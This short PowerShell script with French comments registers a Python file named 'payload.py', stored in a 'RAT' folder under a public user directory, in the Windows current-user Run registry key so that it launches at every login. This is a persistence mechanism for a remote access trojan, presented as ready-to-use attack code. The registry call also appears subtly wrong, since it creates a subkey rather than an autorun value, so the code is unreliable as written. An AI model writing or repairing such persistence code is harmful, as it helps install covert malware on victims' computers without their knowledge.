# Chemin complet vers votre script Python
$pythonScriptPath = "C:\Users\Public\Reseaux publics\RAT\payload.py"

# Nom de la clé de registre
$keyName = "PythonScriptStartup"

# Ajouter une entrée dans le registre pour exécuter le script Python au démarrage
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $keyName -Value $pythonScriptPath -Force
